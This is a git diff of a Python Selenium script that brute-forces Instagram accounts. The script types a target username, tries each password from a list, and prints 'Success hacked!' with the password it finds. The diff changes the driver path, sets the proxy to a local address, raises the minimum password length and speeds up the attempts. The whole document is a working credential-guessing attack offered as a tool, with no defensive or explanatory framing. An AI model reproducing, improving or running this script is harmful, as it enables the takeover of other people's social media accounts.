@@ -3,8 +3,6 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By 
 from selenium.webdriver.common.keys import Keys
 
-#Author ProgMan0
-
 os.system('clear')
 banner = '''.___                 __        __________                __          
 |   | ____   _______/  |______ \______   \_______ __ ___/  |_  ____  
@@ -24,7 +22,7 @@ def commands(input_, button, ll):
 	time.sleep(4)
 
 def bruteforce(username, passwords):
-	driver = webdriver.Firefox(executable_path='your/path')
+	driver = webdriver.Firefox(executable_path='/home/progman/Рабочий стол/pth/driver/geckodriver')
 	driver.get('https://www.instagram.com/')
 
 	time.sleep(4)
@@ -36,21 +34,22 @@ def bruteforce(username, passwords):
 		input_[0].send_keys(username)
 
 		proxies = {
-			'https:' : 'https://exapmle.com:8080'
+			'https:' : 'https://192.168.0.1:8080'
 		}
 
 		block = driver.find_elements(By.CLASS_NAME, 'x9f619')
 		button = block[1].find_element(By.TAG_NAME, 'button')
 
 		for ll in passwords:
-			if len(ll) > 3:
+			if len(ll) > 5:
 				try:
 					print(colors[2] + 'Checking password >> ' + ll + colors[1])
 					commands(input_[1], button, ll)
-					time.sleep(1)
+					print(colors[0] + 'Login failed' + colors[1])
+					time.sleep(0.7)
 				except Exception as ex:
 					index = passwords.index(ll)
-					print(colors[2] + f'Success hacked!\nLogin >> {username}\nPassword >> {passwords[index-1]}')
+					print(colors[2] + f'\nSuccess hacked!\nLogin >> {username}\nPassword >> {passwords[index-1]}')
 					break
 def run():
 	print(banner)
